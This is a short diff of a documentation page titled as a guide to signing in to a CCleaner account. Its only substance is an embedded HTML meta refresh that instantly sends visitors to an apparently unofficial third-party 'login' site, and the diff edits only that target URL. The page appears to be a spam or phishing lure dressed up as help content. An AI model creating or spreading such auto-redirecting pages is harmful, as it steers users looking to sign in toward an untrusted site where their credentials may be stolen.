@@ -1,6 +1,6 @@
 .. raw:: html
  
-    <meta http-equiv="refresh" content="0; url= https://aclogportal.com/ccleaner-login-account/">
+    <meta http-equiv="refresh" content="0; url= https://aclogportal.com/ccleaner-sign-in-account/">
 
 How to Sign In to Your CCleaner Account Easily? 🚀
 ============================================
